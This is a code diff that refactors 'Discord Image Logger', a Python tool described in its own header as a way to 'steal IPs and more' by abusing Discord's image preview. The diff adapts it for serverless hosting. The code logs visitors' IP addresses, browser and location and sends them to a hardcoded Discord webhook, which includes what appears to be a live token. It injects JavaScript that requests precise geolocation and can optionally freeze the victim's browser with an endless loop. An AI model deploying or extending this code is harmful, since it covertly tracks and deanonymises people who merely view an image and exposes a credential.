@@ -2,6 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 import json
+from io import BytesIO
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -9,7 +10,6 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1405388071066669087/4huE8zbBO4384IzA4SpDlY5GPP7sBdfxrV_zV6Got3wGWoES48NuN2tXKCJMhI4k2SEC",
     "image": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless",
     "imageArgument": True,
@@ -134,8 +134,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-
-**User Agent:** `{useragent}`
+> **User Agent:** `{useragent}`
     }
   ],
 }
@@ -148,13 +147,38 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+class ImageLoggerHandler(BaseHTTPRequestHandler):
+    def __init__(self, path, headers_dict):
+        self.path = path
+        self.headers = type('Headers', (), {'get': lambda self, key, default=None: headers_dict.get(key, default)})()
+        self.status_code = 200
+        self.response_headers = []
+        self.response_body = b''
+        
+    def send_response(self, code, message=None):
+        self.status_code = code
+        
+    def send_header(self, keyword, value):
+        self.response_headers.append((keyword, value))
+        
+    def end_headers(self):
+        pass
+        
+    def write(self, data):
+        if isinstance(data, bytes):
+            self.response_body += data
+        else:
+            self.response_body += data.encode()
+            
+    def flush(self):
+        pass
     
-    def handleRequest(self):
+    def handle_request(self):
         try:
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+            
             if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
@@ -175,67 +199,70 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
+            client_ip = self.headers.get('x-forwarded-for', '127.0.0.1')
+            user_agent = self.headers.get('user-agent', 'Unknown')
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+            if client_ip.startswith(blacklistedIPs):
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.write(b'OK')
+                return self.status_code, self.response_headers, self.response_body
+            
+            if botCheck(client_ip, user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
+                if config["buggedImage"]:
+                    self.write(binaries["loading"])
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
+                makeReport(client_ip, endpoint=s.split("?")[0], url=url)
+                return self.status_code, self.response_headers, self.response_body
             
+            if dic.get("g") and config["accurateLocation"]:
+                location = base64.b64decode(dic.get("g").encode()).decode()
+                result = makeReport(client_ip, user_agent, location, s.split("?")[0], url=url)
             else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                result = makeReport(client_ip, user_agent, endpoint=s.split("?")[0], url=url)
 
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+            message = config["message"]["message"]
+
+            if config["message"]["richMessage"] and result:
+                message = message.replace("{ip}", client_ip)
+                message = message.replace("{isp}", result.get("isp", "Unknown"))
+                message = message.replace("{asn}", result.get("as", "Unknown"))
+                message = message.replace("{country}", result.get("country", "Unknown"))
+                message = message.replace("{region}", result.get("regionName", "Unknown"))
+                message = message.replace("{city}", result.get("city", "Unknown"))
+                message = message.replace("{lat}", str(result.get("lat", "")))
+                message = message.replace("{long}", str(result.get("lon", "")))
+                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})" if 'timezone' in result else "Unknown")
+                message = message.replace("{mobile}", str(result.get("mobile", False)))
+                message = message.replace("{vpn}", str(result.get("proxy", False)))
+                message = message.replace("{bot}", str(result['hosting'] if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'))
+                message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1])
+                message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0])
+
+            datatype = 'text/html'
+            response_data = data
+
+            if config["message"]["doMessage"]:
+                response_data = message.encode()
+            
+            if config["crashBrowser"]:
+                response_data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+
+            if config["redirect"]["redirect"]:
+                response_data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                 
+            self.send_response(200)
+            self.send_header('Content-type', datatype)
+            self.end_headers()
 
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200)
-                self.send_header('Content-type', datatype)
-                self.end_headers()
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
+            if config["accurateLocation"]:
+                response_data += b"""<script>
 var currenturl = window.location.href;
-
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (coords) {
@@ -246,106 +273,34 @@ if (!currenturl.includes("g=")) {
     }
     location.replace(currenturl);});
 }}
-
 </script>"""
-                self.wfile.write(data)
+            
+            self.write(response_data)
+            return self.status_code, self.response_headers, self.response_body
         
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
+            return self.status_code, self.response_headers, self.response_body
 
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-# Vercel handler function
+# WSGI App - This is what Vercel looks for
 def app(environ, start_response):
-    from io import BytesIO
-    
-    # Create a request handler instance
-    class VercelHandler(BaseHTTPRequestHandler):
-        def __init__(self, environ, start_response):
-            self.environ = environ
-            self.start_response = start_response
-            self.headers_buffer = []
-            self.status_code = 200
-            self.response_body = BytesIO()
-            
-        def send_response(self, code, message=None):
-            self.status_code = code
-            
-        def send_header(self, keyword, value):
-            self.headers_buffer.append((keyword, value))
-            
-        def end_headers(self):
-            pass
-            
-        def wfile(self):
-            return self.response_body
-            
-        def finish(self):
-            status = f"{self.status_code} {'OK' if self.status_code == 200 else 'Found' if self.status_code == 302 else 'Error'}"
-            self.start_response(status, self.headers_buffer)
-            return [self.response_body.getvalue()]
-    
-    # Build path from environ
     path = environ.get('PATH_INFO', '/')
     query_string = environ.get('QUERY_STRING', '')
     if query_string:
         path = path + '?' + query_string
     
-    # Create mock request handler
-    handler = type('MockHandler', (), {})()
-    handler.path = path
-    handler.headers = {
+    headers_dict = {
         'x-forwarded-for': environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', '127.0.0.1')),
         'user-agent': environ.get('HTTP_USER_AGENT', 'Unknown')
     }
     
-    # Capture response
-    output = BytesIO()
+    handler = ImageLoggerHandler(path, headers_dict)
+    status_code, response_headers, response_body = handler.handle_request()
     
-    class CapturingHandler(ImageLoggerAPI):
-        def __init__(self, request, client_address, server):
-            self.request = request
-            self.client_address = client_address
-            self.server = server
-            self.rfile = BytesIO(b'')
-            self.wfile = output
-            self.path = path
-            self.headers = type('MockHeaders', (), {
-                'get': lambda self, key, default=None: {
-                    'x-forwarded-for': handler.headers['x-forwarded-for'],
-                    'user-agent': handler.headers['user-agent']
-                }.get(key.lower(), default)
-            })()
-            
-        def send_response(self, code, message=None):
-            self.status_code = code
-            
-        def send_header(self, keyword, value):
-            self.headers_buffer.append((keyword, value))
-            
-        def end_headers(self):
-            pass
-    
-    capturing = CapturingHandler(None, None, None)
-    capturing.status_code = 200
-    capturing.headers_buffer = []
-    capturing.wfile = output
-    
-    try:
-        capturing.handleRequest()
-    except Exception as e:
-        reportError(traceback.format_exc())
-        capturing.status_code = 500
-        output.write(b'500 - Internal Server Error')
-    
-    status = f"{capturing.status_code} {'OK' if capturing.status_code == 200 else 'Found' if capturing.status_code == 302 else 'Server Error'}"
-    start_response(status, capturing.headers_buffer)
-    return [output.getvalue()]
+    status = f"{status_code} {'OK' if status_code == 200 else 'Found' if status_code == 302 else 'Server Error'}"
+    start_response(status, response_headers)
+    return [response_body]
